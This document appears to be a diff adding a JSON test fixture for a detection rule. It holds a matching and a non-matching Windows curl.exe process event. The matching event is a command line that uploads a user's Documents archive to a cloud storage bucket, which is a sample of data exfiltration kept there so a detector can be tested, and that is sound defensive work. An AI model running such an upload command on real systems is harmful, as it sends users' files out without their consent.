@@ -1,0 +1,10 @@
+{
+  "matching": {
+    "image": "C:\\Windows\\System32\\curl.exe",
+    "cmdline": "curl.exe -TC:\\Users\\alice\\Documents\\archive.zip https://storage.googleapis.com/acme/archive.zip"
+  },
+  "non_matching": {
+    "image": "C:\\Windows\\System32\\curl.exe",
+    "cmdline": "curl.exe -H \"Content-Type: application/json\" --max-time 30 https://storage.googleapis.com/acme/archive.zip"
+  }
+}
